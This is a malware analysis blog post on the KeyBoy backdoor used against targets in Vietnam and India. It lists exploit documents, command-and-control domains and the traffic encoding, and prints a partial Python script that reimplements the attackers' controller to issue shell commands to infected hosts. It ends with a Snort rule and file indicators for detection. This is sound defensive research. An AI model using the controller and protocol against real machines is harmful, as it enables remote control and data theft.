KeyBoy, Targeted Attacks against Vietnam and India

In our never-ending quest to spot and expose the nastiest of the Internet, me and Mark this time
incidentally stepped into a targeted attacks campaign apparently directed at a distributed and
diversified base of victims. In this blog post we'll analyze two specific incidents apparently targeting
victims in Vietnam and in India and we'll describe the capabilities of the custom backdoor being used
that for convenience (and to our knowledge, for a lack of an existing name) we call KeyBoy, due to a
string present in one of the samples.

We'll describe how the attackers operate these backdoors, provide some scripts useful to further
investigate the campaign as well as meanings to detect infections or scout for additional samples.

Exploits and Payloads

We encountered the first document exploit called "THAM luan- GD- NCKH2.doc" a few days ago, which
appears to be leveraging some vulnerabilities patched with MS12-060. When opened with a vulnerable
version of Microsoft Word, the exploit will initiate the infection routine and display the legitimate
document that follows:

This document, written in Vietnamese, appears to be reviewing and discussing best practices for teaching
and researching scientific topics. We have no knowledge on the identity of the target, but we can assume
he might part of the Vietnamese academic community. The document is named to Nguyen Anh Tuan,
which is presented as author of this crafted text.

Following are the hashes of the exploit file:

We also identified another document exploiting CVE-2012-0158, but this time apparently targeting some
Indian individuals. The content of the document is the following:

This time the bait appears to be related to the state of telecommunication infrastructure in the district of
Calcutta in India, discussing the coverage of GSM networks and availability and stability of broadband
connections.
Also for this intrusion we can't know the identity of the target, but our hypothesis is either someone in the
telecommunications industry or a representative of the local government. In this case this crafted
document pretends to be authored by someone called Amir Kumar Gupta.

All backdoors appear to be compiled on April 1st 2013, suggesting that the attacks are reasonably
recent.

Analysis of the Backdoor

For the sake of this analysis we'll take the Vietnamese backdoor as an example; the one found in the
Indian attack operates in the exact same way.

As mentioned, when the exploit is opened a dropper is created and launched, which then takes care of
creating a Windows service called MdAdum, which is then visible in the registry as follows:

The dropper then launches the service with the DLL located at
C:\WINDOWS\system32\CREDRIVER.dll and deletes itself. Resilience on the system is guaranteed
by the use of such service which will be executed at every start up.

Note that the Indian attack does not make use of this middle-stage dropper, but directly installs and
launches the Windows service instead.

This backdoor has several features including:

1.  Steal credentials from Internet Explorer
2.  Steal credentials from Mozilla Firefox
3.  Install a keylogger for intercepting credentials on Google Chrome
4.  Operate in an interactive mode to allow the attacker to perform additional investigation on the

compromised system and exfiltrate data.

Following you can see the portion of the code where the backdoor, after having verified which version of
Mozilla Firefox is installed on the system, decides which technique to use to recover the credentials from
the browser's local storage.

In older versions of Firefox, credentials were stored in several .txt files in %AppData%\Mozilla\Firefox,
while in most recent ones they are stored in a SQLite database. In the following snipped you see the SQL
statement to extract the data:

Just in the same way, the backdoor attempts to collect password autocomplete  from Internet Explorer:

The backdoor also creates a separate thread that installs a Windows hook procedure on message
WH_KEYBOARD_LL, through which it can intercept keystrokes. We believe this is mainly used to
intercept credentials from other browsers, specifically Google Chrome:

Analysis of the Protocol

The backdoor tries to contact the following domains until it gets a response from an active one:

silence.phdns01.com
cpnet.phmail.us
imlang.phmail.org

The Indian backdoor tries to contact the following domains instead:

cresy.zyns.com
preter.epac.to
backto.ddns.name

In the first set of domains they are either registered with Whois proxy services or with fake identities. In
the second set they are making use of a dynamic DNS service by ChangeIP.com.

Following are traces collected from passive DNS data relevant to the hosts involved in these attacks:

This is an initial request that the backdoor would send out on port 443 to an active C&C:

00000000  c4 4c 87 3f 11 1e c4 1a  2c a9 12 1a 19 61 82 de  |.L.?....,....a..|

00000040  b0 54 b0 19 1a 00                                 |.T....|

At the time of the analysis all the C&C servers were not responding, we started reverse engineering the
communication protocol and noticed that it simply used a multiply with 0x69 to encode the traffic sent to
the controllers. You can easily decode the content of the payload with the following Python snippet:

The previous packet decodes to the following:

$login$

LAB

192.168.56.101

MyUser

2013/06/06 23:56:24

Proxy 20130401

While reverse engineering the backdoor we noticed that the malware expects the following messages from
the C&C server it contacts:

Sysinfo
FileManager
Download
UploadFileOk
Shell

Intrigued by its capabilities, we started reconstructing the communication protocol and
practically building a tool that would operate just like the original controller used by the
attackers. The following is a preliminary Python script that implements the protocol used by the
malware and allows you to interact with it:

18.  def encode(x):  
19.      return ''.join([chr((ord(i)*0x93)&0xff) for i in x])

23.      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
24.      s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
25.      s.bind(("0.0.0.0", 443))  
26.      s.listen(1)

33.          s2, ca = s.accept()  
34.          print "[+] New client connected:", ca  
35.    
36.          while True:  
37.              dec = ""  
38.              rlist, wlist, xlist = select.select([s2,],[],[], 10)  
39.              while rlist:  
40.                  data = s2.recv(2048)  
41.                  if not data: break  
42.    
43.    
44.                  dec = decode(data)  
45.                  print dec  
46.                  rlist, wlist, xlist = select.select([s2,],[],[], 2)  
47.    
48.    

49.              if dec.startswith("$login$"):  
50.                  print "[+] Authenticating on the bot"  
51.                  s2.send(encode("login_OK")+ "\x00")  
52.                  s2.send(encode("Refresh")+ "\x00")  
53.              elif dec.startswith("OnLine"):  
54.                  s2.send(encode("test")+ "\x00")   
55.              else:  
56.                  cmd = raw_input("shell> ").strip()  
57.                  s2.send(encode(cmd)+"\x00")  
58.    
59.    
60.          s2.close()  
61.    
62.    
63.      s.close()  
64.      return 0  
65.    
66.    
67.  if __name__ == "__main__":  
68.      try: sys.exit(main())  
69.      except KeyboardInterrupt: pass  

We then launched this script and redirected the traffic coming from a system infected with KeyBoy and
took control of it .

Here you can see the bot beaconing in and requiring for authentication (funny enough the password is
"test", while the Indian sample uses "dns.com"):

[*] C&C Running on 0.0.0.0:443

[+] Authenticating on the bot

OnLine

Pw_OK

When the authentication is confirmed, we are prompted with a shell through which we can interact in
real-time with the bot. The messages we previously identified represent the actual commands that can be
sent to the bot:

Sysinfo: returns detailed information on the computer (pretty much the output of systeminfo); the
bot will respond with a message with the header $sysinfo$.
FileManager: interact with all the disks available on the victim system; the bot will respond with a
message with the header $fileManager$.
Download: download a file from the compromised system; the bot will respond with a message
with the header $fileDownload$.
UploadFileOk: upload a file to the compromised system; the bot will respond with a message with
the header $fileUpload$.

Most interestingly the command Shell spawns a Windows command shell that we can control remotely:

While the interaction with the bots could also be scripted, it might be plausible that the operators of these
intrusions might be interacting with their targets exclusively manually to collect different data depending
on each individual they infected and the goals they had set for the attack.

Detecting Infections

While these are clearly not widespread attacks and, as in any other targeted attack case, we should not
create alarmism for threats that are likely irrelevant for the majority of organizations, we want to share a
few indicators that might help identify infections or assist in further research by whoever is interested in
this campaign.

Firstly, thanks to the fixed patterns used by the malware in the authentication procedure, we can detect
outbound traffic from infected hosts with the following simple Snort rule:

alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"KeyBoy Backdoor Login"; flow:to_server;
content:"|c4 4c 87 3f 11 1e c4 1a|"; depth:8; sid:1000001; rev:1; classtype:trojan-activity;
reference:url,community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted-attacks-
against-vietnam-and-india)

The simplest way to identify an infection on a given Windows system, is just to look for the existence of the
file C:\WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum.

We also created a couple of Yara rules that you can use to scan your systems your collection of malware
samples to identify copies of KeyBoy:

Conclusions

Not a day passes by without hearing of someone hit by a targeted attack. Recently the growth of amount

and scale of targeted attacks has come to the point were they are starting to look more like
opportunistic carpet bombings rather than ninja strikes. It's common to observe attacks pulled
off successfully without any particular sophistication in place, including the incidents described in this
post.

It's also getting quite difficult to attribute the attacks to any state-sponsored unit, both because there's a
generic lack of strong evidence in such incidents (which is why we refrained from making any statement
on the origin of these intrusions) but frankly also because almost anybody could operate such
campaigns and be reasonably successful. The only differentiation between actors at this point exclusively
relies on identifying the motivations and the context.

Beware though, just because these attacks are conceptually targeted, it doesn't necessarily mean that they
should have a higher priority than any other threat on your security program. Our suggestion remains the
same: identify your core assets, recognize the most impactful threats to such assets and inform and protect
yourself accordingly.
